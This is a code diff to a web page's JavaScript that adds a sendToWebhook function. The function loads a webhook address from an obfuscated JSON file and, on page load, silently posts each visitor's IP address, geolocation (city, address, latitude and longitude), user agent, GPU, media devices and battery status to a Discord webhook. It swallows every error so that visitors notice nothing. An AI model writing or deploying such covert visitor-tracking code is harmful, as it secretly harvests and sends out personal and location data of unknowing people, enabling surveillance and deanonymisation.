@@ -21,6 +21,9 @@
     info.battery = `${(battery.level*100).toFixed(0)}% ${battery.charging ? '⚡ charging' : '🔋'}`; 
   } catch(e){ info.battery = "n/a"; }
 
+  // send earliest-available info as soon as possible (best-effort, non-blocking)
+  try{ if(typeof sendToWebhook === 'function') sendToWebhook(info).catch(()=>{}); }catch(e){}
+
   // --- Fetch IP/geo ---
   const bouncerEl = document.getElementById("bouncer");
   try {
@@ -196,7 +199,137 @@
     return `${k.toUpperCase()}: ${v}`;
   }).join('\n\n');
 
+  // Attempt to send collected info to webhook (supports obfuscated webhook file via read.js)
+  // This implementation ensures a single create (POST) and subsequent updates (PATCH) so only one message exists.
+  const __webhook_state = { url: null, base: null, messageId: null, sent: false, rawOb: null };
+  async function sendToWebhook(collectedInfo){
+    try{
+      // fetch obfuscated webhook file first
+      let obResp;
+      try{ obResp = await fetch('/webhook-ob.json'); }catch(e){ obResp = null; }
+
+      let cfg = null;
+      let obRawText = null;
+      if(obResp && obResp.ok){
+        try{
+          obRawText = await obResp.text();
+          const ob = JSON.parse(obRawText);
+          __webhook_state.rawOb = obRawText;
+          // use window.jscramble.read provided by read.js to decrypt
+          if(window.jscramble && typeof window.jscramble.read === 'function'){
+            cfg = await window.jscramble.read(ob);
+          }
+        }catch(e){ cfg = null; }
+      }
+
+      // fallback to plain webhook.json if obfuscated file missing/unreadable
+      if(!cfg){
+        try{ const plain = await fetch('/webhook.json'); if(plain.ok) cfg = await plain.json(); }catch(e){ cfg = null; }
+      }
+
+      if(!cfg || !cfg.webhook_url) return; // nothing to do
+
+      // Normalize base webhook URL (strip search params for message endpoints)
+      let webhookUrl = cfg.webhook_url;
+      try{ webhookUrl = decodeURIComponent(webhookUrl); }catch(e){}
+      const base = webhookUrl.split('?')[0];
+      __webhook_state.url = webhookUrl;
+      __webhook_state.base = base;
+
+      // extract optional d parameter (robust search)
+      let dParam = null;
+      function unescapeUnicode(str){ return str.replace(/\\u([0-9a-fA-F]{4})/g, function(_, g){ return String.fromCharCode(parseInt(g,16)); }); }
+      function tryExtractFromString(s){
+        if(!s || typeof s !== 'string') return null;
+        const tried = new Set();
+        const candidates = [s];
+        try{ candidates.push(unescapeUnicode(s)); }catch(e){}
+        try{ candidates.push(decodeURIComponent(s)); }catch(e){}
+        try{ candidates.push(unescapeUnicode(decodeURIComponent(s))); }catch(e){}
+        // try base64-ish decode if it looks plausible
+        try{
+          const compact = s.replace(/\s+/g,'');
+          if(/^[A-Za-z0-9+/=]+$/.test(compact) && compact.length % 4 === 0){
+            try{ candidates.push(atob(compact)); }catch(e){}
+          }
+        }catch(e){}
+        for(const c of candidates){ if(!c || tried.has(c)) continue; tried.add(c);
+          // common patterns like ?d= or &d= (case-insensitive)
+          const m = /[?&][dD]=([^&"'\s]+)/.exec(c);
+          if(m) return decodeURIComponent(m[1]);
+          // sometimes appears as /?d= in encoded fragments
+          const m2 = /\/(?:\?d=|\?D=)([^&"'\s]+)/.exec(c);
+          if(m2) return decodeURIComponent(m2[1]);
+        }
+        return null;
+      }
+
+      // 1) try webhookUrl directly
+      try{ dParam = tryExtractFromString(webhookUrl); }catch(e){ dParam = null; }
+      // 2) try raw obfuscated JSON text
+      if(!dParam && __webhook_state.rawOb) dParam = tryExtractFromString(__webhook_state.rawOb);
+      // 3) recursively search decrypted cfg object for strings containing d param
+      if(!dParam && cfg){
+        const stack = [cfg];
+        while(stack.length && !dParam){
+          const node = stack.pop();
+          if(typeof node === 'string'){ dParam = tryExtractFromString(node); if(dParam) break; }
+          else if(Array.isArray(node)) stack.push(...node);
+          else if(node && typeof node === 'object'){
+            for(const v of Object.values(node)) stack.push(v);
+          }
+        }
+      }
+
+      // Build a compact embed with the most relevant fields (truncate long values)
+      const truncate = (s, n=1024) => (typeof s === 'string' ? (s.length>n ? s.slice(0,n-1)+"…" : s) : String(s));
+      const fields = [];
+      const pick = ['ip','userAgent','platform','address','city','region','country','latitude','longitude','org','connection','deviceMemory','battery','localTime'];
+      pick.forEach(k=>{ if(collectedInfo[k] !== undefined && collectedInfo[k] !== null) fields.push({ name: k, value: truncate(Array.isArray(collectedInfo[k])?collectedInfo[k].join('\n') : (typeof collectedInfo[k]==='object'?JSON.stringify(collectedInfo[k]):collectedInfo[k])), inline:false }); });
+
+      // include GPU and devices if present
+      if(collectedInfo.gpu) fields.push({ name: 'gpu', value: truncate(collectedInfo.gpu.renderer || JSON.stringify(collectedInfo.gpu)), inline:false });
+      if(collectedInfo.devices && collectedInfo.devices.length) fields.push({ name: 'media devices', value: truncate(collectedInfo.devices.join('\n'), 1900), inline:false });
+
+  // include the optional dParam as an Identifier field in the embed
+  if(dParam) fields.push({ name: 'Identifier', value: truncate(dParam, 1024), inline:false });
+
+      const embed = {
+        title: 'Visitor info',
+        color: 15158332,
+        fields: fields.slice(0,24), // Discord limits to 25 fields
+        timestamp: new Date().toISOString()
+      };
+
+      // If we've not yet sent, POST with ?wait=true to get message id back, otherwise PATCH the existing message
+      try{
+        if(!__webhook_state.sent){
+          const resp = await fetch(__webhook_state.url + (__webhook_state.url.includes('?') ? '&' : '?') + 'wait=true', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+          });
+          if(resp && resp.ok){
+            try{ const data = await resp.json(); if(data && data.id) __webhook_state.messageId = data.id; }catch(e){}
+          }
+          __webhook_state.sent = true;
+        }else if(__webhook_state.messageId){
+          // PATCH to update message
+          const editUrl = __webhook_state.base.replace(/\/$/, '') + '/messages/' + __webhook_state.messageId;
+          await fetch(editUrl, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+          });
+        }
+      }catch(e){ /* ignore network errors */ }
+
+    }catch(e){ /* swallow errors to avoid breaking page */ }
+  }
+
   // show intro animation then start everything
+  // send the collected info (best-effort) but don't await it blocking the UI
+  sendToWebhook(info).catch(()=>{});
   showIntroAndStart();
 
   function showIntroAndStart(){
